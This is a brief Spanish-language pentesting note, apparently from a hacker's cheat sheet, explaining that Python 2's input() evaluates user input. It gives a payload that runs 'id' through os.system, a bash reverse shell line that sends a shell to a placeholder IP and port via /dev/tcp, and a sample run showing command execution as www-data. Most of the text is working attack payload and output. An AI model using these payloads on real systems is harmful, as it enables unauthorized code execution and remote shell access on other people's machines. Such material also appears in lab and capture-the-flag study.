

# Python 2 

En python2, los inputs ejecutan el codigo que reciban con un eval, por lo que si vemos un archivo de python que haga un input podemos ingresar lo siguiente:

```python
__import__('os').system('id')
```

#### RevShell:

```python
__import__('os').system('/bin/bash -c "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
```

EJ:

```python
## script.py 
## respuesta = input("Ingrese su nombre: ")
## print(respuesta)

$> python2 script.py
Ingrese su nombre: __import__('os').system('id')
uid=1002(developer) gid=33(www-data) groups=33(www-data)
Traceback (most recent call last):
...[snip]...
```








